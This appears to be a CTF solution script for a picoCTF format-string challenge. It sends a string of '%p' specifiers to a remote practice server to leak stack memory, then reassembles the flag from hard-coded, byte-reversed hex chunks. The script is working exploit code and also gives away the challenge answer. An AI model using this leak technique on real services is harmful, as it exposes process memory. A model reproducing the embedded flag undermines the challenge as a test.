import pwn

payload: bytes = (32*"%p.").encode("utf-8")

URL:  str = "mimas.picoctf.net"
PORT: int = 56524


conn = pwn.remote(URL, PORT)

conn.recvuntil(b"ou:")
conn.sendline(payload)


output: str = conn.recvuntil(b"ye!").decode()\
                                    .strip()

output: str = output.replace("Here's your order: ", "", -1)\
                    .replace("Bye!", "", -1)\
                    .replace("\n", "", -1)

output: str = output.split(sep=".", maxsplit=-1)


flag_pieces: list[str] = []

for address in output:

    address = address[2::].replace("il)", "", -1)

    if address != '':
        try:
            decoded: str = bytes.fromhex(address).decode('utf-8', errors='ignore')

            if address == "7b4654436f636970" or\
               address == "355f31346d316e34" or\
               address == "3478345f33317937" or\
               address == "35625f673431665f" or\
               address == "7d663839623764":

                print(f"{address} = ", decoded)
                flag_pieces.append(decoded)
                continue

            print(f"{address} = {decoded}")

        except Exception:
            pass
    continue


flag: str = flag_pieces[0][::-1]
flag += flag_pieces[2][::-1]
flag += flag_pieces[3][::-1]
flag += flag_pieces[1][::-1]
flag += flag_pieces[4][::-1]


print(flag_pieces)
print("flag:", flag)


conn.close()
